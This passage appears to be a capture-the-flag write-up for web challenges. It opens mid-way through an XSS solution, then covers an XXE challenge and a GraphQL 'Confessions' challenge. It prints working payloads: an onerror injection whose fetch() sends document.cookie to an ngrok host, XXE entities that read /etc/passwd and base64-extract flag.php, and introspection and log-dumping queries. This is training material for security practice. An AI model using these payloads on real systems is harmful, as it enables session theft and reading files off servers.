We can execute code by putting a bad link and putting code in ```src/onerror``` ([source](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onerror))

Input:
```
abc" src/onerror="alert(1)
```
Result html:
```html
<img src="abc" src/onerror="alert(1)">
```

We can then use the same method we used in whatsup to get the cookie:
```
abc" src/onerror="fetch('https://7f09-163-5-23-68.eu.ngrok.io', {method: 'post', body: document.cookie})
```

flag: ```BFS{4n_1m4g3_79_w0r7h_a_7h0u54nd_w0rd5}```

# xxe1

## What it is

A website with an input field.

The message is sent to the server in the form of an xml (base64 + URI encoded).

The decoded xml looks like this:
```xml
<?xml version="1.0"?>
<document>
	<message>abc</message>
</document>
```

It returns a message like this:
```
Thanks for your message: 'abc'
```

In the source of the page we can see:
```html
<!-- // include_once('flag.php'); -->
```

## Solution

(see solve.js)

[xxe overview](https://portswigger.net/web-security/xxe)

We can use some xml features to retrieve external entities from the server ([source](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file)).

For example:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<document>
	<message>&xxe;</message>
</document>
```

```file://``` will not work for ```flag.php``` because it will be interpreted by php, we can use ```php://filter/convert.base64-encode/resource=``` instead (see [lfi1](#lfi1)).

The final payload looks like this:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"> ]>
<document>
	<message>&xxe;</message>
</document>
```

flag.php:
```php
<?php

$flag = "BFS{XX3_FtW_SRL5Y_F0UND_TH3SE_D4YS_1T_W4S_H4RD_T0_D3V}";
```

flag: ```BFS{XX3_FtW_SRL5Y_F0UND_TH3SE_D4YS_1T_W4S_H4RD_T0_D3V}```

# Confessions

## What it is

It's a website where you can enter a message, the message will be hashed with sha256 and sent to a server.

The message is hashed and sent every time the input changes (with every character).

This request gives us the types on the graphql API ([source](https://graphql.org/learn/introspection/)):
```
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
```
https://confessions.secu-web.blackfoot.dev/graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```
(see types.json for the result)

One interesting type is ```RequestLog``` which has the description ```Show the resolver access log. TODO: remove before production release```.

We can get all access logs with:
```bash
curl 'https://confessions.secu-web.blackfoot.dev/graphql?query=\{requestsLog\{name,args,timestamp\}\}'
```
(see logs.json for the result)

## Solution

(see index.js)

If, for example, someone types "abc" on the website it will make 3 hashes:
1. "a"
2. "ab"
3. "abc"

We can get the first log, which must be 1 character long, and brute force it.

Once we have the first character we can get the second log and brute force the second character and so on.

flag: ```ZOB{plz_d0nt_t3ll_any1}```


